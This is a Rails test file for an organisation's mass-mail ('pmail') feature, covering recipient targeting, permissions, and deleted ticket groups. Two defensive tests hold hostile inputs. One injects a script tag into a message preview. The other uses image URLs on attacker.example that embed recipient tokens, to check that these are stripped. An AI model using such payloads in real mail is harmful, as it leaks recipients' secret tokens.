require File.expand_path("#{File.dirname(__FILE__)}/test_config.rb")

class PmailsTest < ActiveSupport::TestCase
  include Capybara::DSL

  test 'creating a pmail' do
    create_organisation
    pmail = FactoryBot.build_stubbed(:pmail)
    sign_in(@account)
    visit "/o/#{@organisation.slug}/pmails"
    click_link 'New message'
    fill_in 'Subject', with: pmail.subject
    execute_script %{$('#pmail_to_option').val('everyone')}
    click_button 'Save'
    assert page.has_content? 'The mail was saved'
  end

  test 'editing a pmail' do
    create_organisation
    pmail = FactoryBot.create(:pmail, organisation: @organisation, recipient_kind: 'everyone')
    sign_in(@account)
    visit "/o/#{@organisation.slug}/pmails"
    click_link 'Edit'
    fill_in 'Subject', with: (subject = FactoryBot.build_stubbed(:pmail).subject)
    click_button 'Save'
    assert page.has_content? 'The mail was saved'
    visit "/pmails/#{pmail.id}/preview?organisation_id=#{@organisation.id}"
    assert page.has_title? subject
  end

  test 'pmail preview blocks scripts' do
    create_organisation
    pmail = FactoryBot.create(:pmail, organisation: @organisation, recipient_kind: 'everyone', body: '<p>Hi</p><script>document.title = "pwned"</script>')
    sign_in(@account)
    visit "/pmails/#{pmail.id}/preview?organisation_id=#{@organisation.id}"
    assert_includes page.response_headers.transform_keys(&:downcase)['content-security-policy'], "script-src 'none'"
    refute page.has_title? 'pwned'
  end

  test 'organisation pmail list can be filtered by recipients' do
    create_event(allow_ticket_type_waitlists: true)
    activity = FactoryBot.create(:activity, organisation: @organisation)
    ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 0)
    ticket_group = @event.ticket_groups.create!(name: 'Backstage', capacity: 10)
    to_options = {
      'To everyone' => 'everyone',
      'To monthly donors' => 'monthly_donors',
      'To facilitators' => 'facilitators',
      'To activity' => "activity:#{activity.id}",
      'To event' => "event:#{@event.id}",
      'To waitlist' => "waitlist:#{@event.id}",
      'To ticket type waitlist' => "ticket_type_waitlist:#{ticket_type.id}",
      'To ticket group' => "ticket_group:#{ticket_group.id}"
    }
    to_options.each do |subject, to_option|
      FactoryBot.create(:pmail, organisation: @organisation, account: @account, subject: subject, to_option: to_option)
    end

    expected = {
      'everyone' => ['To everyone'],
      'monthly_donors' => ['To monthly donors'],
      'facilitators' => ['To facilitators'],
      'activity' => ['To activity'],
      'waitlist' => ['To waitlist', 'To ticket type waitlist'],
      'event' => ['To event', 'To waitlist', 'To ticket type waitlist', 'To ticket group']
    }

    sign_in(@account)
    expected.each do |to, subjects|
      visit "/o/#{@organisation.slug}/pmails?to=#{to}"
      to_options.each_key do |subject|
        if subjects.include?(subject)
          assert page.has_link?(subject, exact: true), "#{to} should include #{subject}"
        else
          assert page.has_no_link?(subject, exact: true), "#{to} should not include #{subject}"
        end
      end
    end
  end

  test 'event admins cannot target recipients they do not administer' do
    create_event
    create_event(as: :event2)
    organiser = FactoryBot.create(:account)
    @event.set(organiser_id: organiser.id)
    pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "event:#{@event.id}")
    pmail.editor = organiser

    %w[everyone monthly_donors not_monthly_donors facilitators].each do |to_option|
      pmail.to_option = to_option
      assert_not pmail.valid?, to_option
    end
    pmail.to_option = "event:#{@event2.id}"
    assert_not pmail.valid?
    pmail.to_option = "event:#{@event.id}"
    assert pmail.valid?

    assert_includes Pmail.protected_attributes, 'recipient_kind'
  end

  test 'ticket group pmail does not fall back to event recipients when group is deleted' do
    create_event
    ticket_group = @event.ticket_groups.create!(name: 'Backstage', capacity: 10)
    ticket_type = FactoryBot.create(:ticket_type, event: @event, ticket_group: ticket_group, quantity: 10)
    other_ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 10)
    attendee = FactoryBot.create(:account)
    other_attendee = FactoryBot.create(:account)
    Ticket.create!(event: @event, account: attendee, ticket_type: ticket_type, price: 0)
    Ticket.create!(event: @event, account: other_attendee, ticket_type: other_ticket_type, price: 0)
    Ticket.create!(event: @event, ticket_type: ticket_type, price: 0, email: 'guest@example.com')
    pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "ticket_group:#{ticket_group.id}")
    ticket_group_id = ticket_group.id

    assert_equal [attendee.id], pmail.to.pluck(:id)
    assert_equal 2, pmail.send_count

    ticket_group.destroy
    pmail.reload

    assert_equal "ticket_group:#{ticket_group_id}", pmail.to_selected
    assert_empty pmail.to.pluck(:id)
    assert_empty pmail.event_emails
    assert_equal 0, pmail.send_count

    pmail.to_option = "ticket_group:#{ticket_group_id}"
    pmail_count = Pmail.count
    assert_nil pmail.duplicate!(@account)
    assert_equal pmail_count, Pmail.count
    assert_includes pmail.errors.full_messages, 'This mail cannot be duplicated because its ticket group no longer exists.'

    sign_in(@account)
    visit "/pmails/#{pmail.id}/edit?event_id=#{@event.id}"
    pmail_count = Pmail.count
    click_button 'Duplicate'

    assert page.has_content? 'This mail cannot be duplicated because its ticket group no longer exists.'
    assert_equal pmail_count, Pmail.count

    visit "/pmails/#{pmail.id}/edit?event_id=#{@event.id}"
    fill_in 'Subject', with: 'Still a deleted ticket group'
    click_button 'Save'

    assert page.has_content? 'The mail was saved'
    pmail.reload
    assert_equal 'Still a deleted ticket group', pmail.subject
    assert_equal "ticket_group:#{ticket_group_id}", pmail.to_selected
    assert_empty pmail.to.pluck(:id)
  end

  test 'ticket group pmail is labelled in the pmail list' do
    create_event
    ticket_group = @event.ticket_groups.create!(name: 'Backstage', capacity: 10)
    FactoryBot.create(:pmail, organisation: @organisation, to_option: "ticket_group:#{ticket_group.id}")

    sign_in(@account)
    visit "/events/#{@event.id}/pmails"

    assert page.has_content? 'Ticket group Backstage'
  end

  test 'ticket type waitlist pmails target waiters for a ticket type or all ticket types' do
    create_event(allow_ticket_type_waitlists: true)
    weekend = FactoryBot.create(:ticket_type, event: @event, quantity: 0, name: 'Weekend')
    day = FactoryBot.create(:ticket_type, event: @event, quantity: 0, name: 'Day')
    weekend_waiter = FactoryBot.create(:account)
    day_waiter = FactoryBot.create(:account)
    both_waiter = FactoryBot.create(:account)
    event_waiter = FactoryBot.create(:account)
    TicketTypeWaitship.create!(ticket_type: weekend, account: weekend_waiter)
    TicketTypeWaitship.create!(ticket_type: day, account: day_waiter)
    TicketTypeWaitship.create!(ticket_type: weekend, account: both_waiter)
    TicketTypeWaitship.create!(ticket_type: day, account: both_waiter)
    @event.waitships.create!(account: event_waiter)

    waitlist_pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "waitlist:#{@event.id}")
    assert_equal [event_waiter.id], waitlist_pmail.to.pluck(:id)

    weekend_pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "ticket_type_waitlist:#{weekend.id}")
    assert_equal [weekend_waiter.id, both_waiter.id].sort, weekend_pmail.to.pluck(:id).sort
    assert_equal 2, weekend_pmail.send_count
    assert_equal "on the Weekend waitlist for #{@organisation.name}'s event #{@event.name}", weekend_pmail.reason

    all_pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "all_ticket_type_waitlists:#{@event.id}")
    assert_equal [weekend_waiter.id, day_waiter.id, both_waiter.id].sort, all_pmail.to.pluck(:id).sort
    assert_equal 3, all_pmail.send_count
    assert_equal "on a ticket type waitlist for #{@organisation.name}'s event #{@event.name}", all_pmail.reason
  end

  test 'ticket type waitlist pmail does not fall back to event recipients when ticket type is deleted' do
    create_event(allow_ticket_type_waitlists: true)
    ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 0, name: 'Weekend')
    other_ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 0, name: 'Day')
    waiter = FactoryBot.create(:account)
    other_waiter = FactoryBot.create(:account)
    TicketTypeWaitship.create!(ticket_type: ticket_type, account: waiter)
    TicketTypeWaitship.create!(ticket_type: other_ticket_type, account: other_waiter)
    pmail = FactoryBot.create(:pmail, organisation: @organisation, account: @account, to_option: "ticket_type_waitlist:#{ticket_type.id}")
    ticket_type_id = ticket_type.id

    assert_equal [waiter.id], pmail.to.pluck(:id)
    assert_equal 1, pmail.send_count

    ticket_type.destroy
    pmail.reload

    assert_equal "ticket_type_waitlist:#{ticket_type_id}", pmail.to_selected
    assert_empty pmail.to.pluck(:id)
    assert_equal 0, pmail.send_count

    pmail.to_option = "ticket_type_waitlist:#{ticket_type_id}"
    pmail_count = Pmail.count
    assert_nil pmail.duplicate!(@account)
    assert_equal pmail_count, Pmail.count
    assert_includes pmail.errors.full_messages, 'This mail cannot be duplicated because its ticket type no longer exists.'

    sign_in(@account)
    visit "/pmails/#{pmail.id}/edit?event_id=#{@event.id}"
    pmail_count = Pmail.count
    click_button 'Duplicate'

    assert page.has_content? 'This mail cannot be duplicated because its ticket type no longer exists.'
    assert_equal pmail_count, Pmail.count

    visit "/pmails/#{pmail.id}/edit?event_id=#{@event.id}"
    fill_in 'Subject', with: 'Still a deleted ticket type waitlist'
    click_button 'Save'

    assert page.has_content? 'The mail was saved'
    pmail.reload
    assert_equal 'Still a deleted ticket type waitlist', pmail.subject
    assert_equal "ticket_type_waitlist:#{ticket_type_id}", pmail.to_selected
    assert_empty pmail.to.pluck(:id)
  end

  test 'ticket type waitlist pmail is labelled in the pmail list' do
    create_event(allow_ticket_type_waitlists: true)
    ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 0, name: 'Weekend')
    FactoryBot.create(:pmail, organisation: @organisation, to_option: "ticket_type_waitlist:#{ticket_type.id}")
    FactoryBot.create(:pmail, organisation: @organisation, to_option: "all_ticket_type_waitlists:#{@event.id}")

    sign_in(@account)
    visit "/events/#{@event.id}/pmails"

    assert page.has_content? 'Ticket type waitlist Weekend'
    assert page.has_content? 'Ticket type waitlists:'
  end

  test 'event pmail to options include ticket type waitlists when enabled' do
    create_event(allow_ticket_type_waitlists: true)
    ticket_type = FactoryBot.create(:ticket_type, event: @event, quantity: 1, name: 'Weekend')

    sign_in(@account)
    visit "/pmails/new?event_id=#{@event.id}"

    assert page.has_css?("option[value='all_ticket_type_waitlists:#{@event.id}']")
    assert page.has_css?("option[value='ticket_type_waitlist:#{ticket_type.id}']")
    assert page.has_css?("option[value='waitlist:#{@event.id}']")
  end

  test 'pmail exclusions must belong to its organisation' do
    create_organisation
    other_organisation = FactoryBot.create(:organisation)
    pmail = FactoryBot.build(
      :pmail,
      organisation: @organisation,
      event: FactoryBot.create(:event, organisation: other_organisation),
      activity: FactoryBot.create(:activity, organisation: other_organisation),
      local_group: FactoryBot.create(:local_group, organisation: other_organisation)
    )

    refute pmail.valid?
    assert_includes pmail.errors[:event], 'must belong to the same organisation'
    assert_includes pmail.errors[:activity], 'must belong to the same organisation'
    assert_includes pmail.errors[:local_group], 'must belong to the same organisation'
  end

  test 'pmail html strips recipient secrets from off-site images' do
    create_organisation
    pmail = FactoryBot.create(
      :pmail,
      organisation: @organisation,
      recipient_kind: 'everyone',
      preview_text: '<img src="https://attacker.example/%recipient.org_unsubscribe_token%">',
      body: '<p>Hi %recipient.firstname%</p><img src="https://attacker.example/%recipient.token%">'
    )
    html = pmail.html

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_match(%r{src="[^"]*%recipient\.org_unsubscribe_token%}, html)
    assert_includes html, '%recipient.firstname%'
  end

  test 'email templates defuse recipient variables in escaped output' do
    Tempfile.create(['email', '.erb']) do |file|
      file.write('<p><%= name %></p><p><%== raw %></p>')
      file.flush
      context = EmailHelper::TemplateContext.new(name: 'Hi %recipient.firstname% 50%20', raw: '%recipient.firstname%')
      html = EmailHelper.render_erb(file.path, context)

      assert_includes html, "<p>Hi %\u200Crecipient.firstname%\u200C 50%20</p>"
      assert_includes html, '<p>%recipient.firstname%</p>'
    end
  end

  test 'pmail can exclude a cohosted event' do
    create_organisation
    event = FactoryBot.create(:event)
    event.cohostships.create!(organisation: @organisation)
    pmail = FactoryBot.build(:pmail, organisation: @organisation, event: event)

    assert pmail.valid?, pmail.errors.full_messages.to_sentence
  end
end
